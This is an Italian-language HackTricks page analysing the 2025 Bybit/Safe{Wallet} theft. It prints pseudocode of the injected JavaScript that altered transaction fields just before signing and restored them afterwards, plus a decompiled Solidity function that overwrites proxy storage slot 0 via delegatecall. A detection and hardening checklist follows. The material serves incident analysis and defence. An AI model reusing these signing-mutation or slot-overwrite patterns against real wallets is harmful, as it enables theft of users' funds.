# Compromissione del workflow di signing Web3 e takeover del proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Una catena di furto da cold wallet ha combinato una **supply-chain compromise della web UI di Safe{Wallet}** con una **primitiva on-chain di delegatecall che sovrascriveva il puntatore all'implementazione di un proxy (slot 0)**. I punti chiave sono:

- Se una dApp può iniettare codice nel signing path, può fare in modo che un signer produca una **firma EIP-712 valida su campi scelti dall'attacker**<sup>[[4]](#references)</sup> ripristinando al contempo i dati originali della UI, così che gli altri signer rimangano all'oscuro.
- I proxy Safe memorizzano `masterCopy` (implementazione) nello **storage slot 0**. Una delegatecall verso un contratto che scrive nello slot 0 effettua di fatto un “upgrade” del Safe alla logica dell'attacker, ottenendo il controllo completo del wallet.

## Off-chain: mutazione mirata del signing in Safe{Wallet}

Un bundle di Safe manomesso (`_app-*.js`) attaccava selettivamente specifici indirizzi Safe + signer. La logica iniettata veniva eseguita subito prima della chiamata di signing:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Proprietà dell'attacco
- **Vincolato al contesto**: le allowlist hard-coded per le Safe/firmatari vittima hanno impedito il rumore e ridotto il rilevamento.<sup>[[1]](#references)[[3]](#references)</sup>
- **Mutazione all'ultimo momento**: i campi (`to`, `data`, `operation`, gas) venivano sovrascritti immediatamente prima di `signTransaction`, quindi ripristinati; di conseguenza, i payload delle proposte nell'interfaccia apparivano innocui, mentre le firme corrispondevano al payload dell'attacker.
- **Opacità di EIP-712**: i wallet mostravano dati strutturati, ma non decodificavano il calldata annidato né evidenziavano `operation = delegatecall`, rendendo il messaggio mutato di fatto blind-signed.

### Rilevanza della validazione del Gateway
Le proposte Safe vengono inviate al **Safe Client Gateway**.<sup>[[5]](#references)</sup> Prima dell'introduzione dei controlli hardenizzati, il gateway poteva accettare una proposta in cui `safeTxHash`/firma corrispondevano a campi diversi da quelli del corpo JSON, se l'interfaccia li riscriveva dopo la firma. Dopo l'incident, il gateway ora rifiuta le proposte il cui hash/la cui firma non corrispondono alla transaction inviata. Una verifica server-side analoga dell'hash dovrebbe essere applicata a qualsiasi API di orchestrazione delle firme.

### Elementi salienti dell'incident Bybit/Safe del 2025
- Il drain del cold wallet di Bybit del 21 febbraio 2025 (~401k ETH) ha riutilizzato lo stesso pattern: un bundle S3 di Safe compromesso si attivava solo per i firmatari Bybit e scambiava `operation=0` → `1`, impostando `to` sull'attacker contract pre-deployed che scrive nello slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- `_app-52c9031bfa03da47.js`, conservato nella cache di Wayback, mostra la logica basata sulla Safe di Bybit (`0x1db9…cf4`) e sugli indirizzi dei firmatari, per poi ripristinarsi immediatamente a un bundle pulito due minuti dopo l'esecuzione, replicando il trucco “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Il contratto malevolo (ad esempio, `0x9622…c7242`) conteneva semplici funzioni `sweepETH/sweepERC20` oltre a una `transfer(address,uint256)` che scrive nello implementation slot. L'esecuzione di `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` ha spostato l'implementazione della proxy e concesso il controllo completo.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: takeover della proxy tramite delegatecall e collisione dello slot

Le proxy Safe mantengono `masterCopy` nello **storage slot 0** e delegano tutta la logica a esso. Poiché Safe supporta **`operation = 1` (delegatecall)**, qualsiasi transaction firmata può puntare a un contract arbitrario ed eseguire il relativo codice nel contesto dello storage della proxy.<sup>[[3]](#references)</sup>

Un attacker contract imitava una `transfer(address,uint256)` ERC-20, ma scriveva invece `_to` nello slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Percorso di esecuzione:<sup>[[1]](#references)[[3]](#references)</sup>
1. Le vittime firmano `execTransaction` con `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Il masterCopy di Safe convalida le firme su questi parametri.
3. Il proxy esegue una delegatecall verso `attackerContract`; il corpo di `transfer` scrive nello slot 0.
4. Lo slot 0 (`masterCopy`) ora punta a una logica controllata dall'attaccante → **presa di controllo completa del wallet e sottrazione dei fondi**.

### Note su Guard e versioni (hardening post-incidente)
- I Safe >= v1.3.0 possono installare un **Guard** per bloccare `delegatecall` o applicare ACL su `to`/selector; Bybit utilizzava la v1.1.1, quindi non era disponibile alcun hook Guard. È necessario eseguire l'upgrade dei contract (e aggiungere nuovamente gli owner) per ottenere questo control plane.

## Checklist di rilevamento e hardening

- **Integrità della UI**: bloccare gli asset JS / usare SRI; monitorare le differenze tra i bundle; considerare la signing UI parte del trust boundary.
- **Validazione al momento della firma**: hardware wallet con **EIP-712 clear-signing**; mostrare esplicitamente `operation` e decodificare la calldata annidata. Rifiutare la firma quando `operation = 1`, salvo autorizzazione da parte della policy.
- **Controlli degli hash lato server**: i gateway/servizi che inoltrano le proposte devono ricalcolare `safeTxHash` e verificare che le firme corrispondano ai campi inviati.
- **Policy/allowlist**: regole di preflight per `to`, selector e tipi di asset, vietando delegatecall salvo nei flussi verificati. Richiedere un servizio di policy interno prima di effettuare il broadcasting delle transazioni completamente firmate.
- **Design dei contract**: evitare di esporre delegatecall arbitrari nei wallet multisig/treasury, salvo stretta necessità. Posizionare i puntatori agli upgrade lontano dallo slot 0 oppure proteggerli con una logica di upgrade esplicita e access control.
- **Monitoring**: generare alert sulle esecuzioni delegatecall provenienti da wallet che detengono fondi treasury e sulle proposte che modificano `operation` rispetto ai tipici pattern `call`.

## Riferimenti

- [1] [Analisi forense di AnChain.AI dell'exploit del Safe di Bybit](https://www.anchain.ai/blog/bybit)
- [2] [Analisi di Zero Hour Technology sulla compromissione del bundle Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Analisi tecnica approfondita dell'hack di Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
